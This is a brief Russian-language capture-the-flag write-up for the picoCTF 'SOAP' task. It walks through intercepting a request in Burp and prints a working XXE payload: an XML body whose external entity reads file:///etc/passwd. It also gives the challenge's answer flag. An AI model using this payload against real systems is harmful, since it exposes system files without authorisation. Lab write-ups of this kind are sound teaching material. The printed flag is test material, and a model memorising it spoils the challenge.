**Задание SOAP**

Заходим на сайт → включаем burp → нажимаем на любую кнопку → отправляем запрос в Repeater → модифицируем → получаем флаг\
\
Нам просто нужно сделать запрос POST \<url_of_site\>/data с полезной нагрузкой XML, чтобы получить флаг (рис 1)

![img](media/Задание_SOAP/media/image1.png)

\<?xml version=\"1.0\" encoding=\"UTF-8\"?\>

\<!DOCTYPE data \[

\<!ENTITY file SYSTEM \"file:///etc/passwd\"\>

\]\>

\<data\>\<ID\>&file;\</ID\>\</data\>

**ОТВЕТ: picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}**

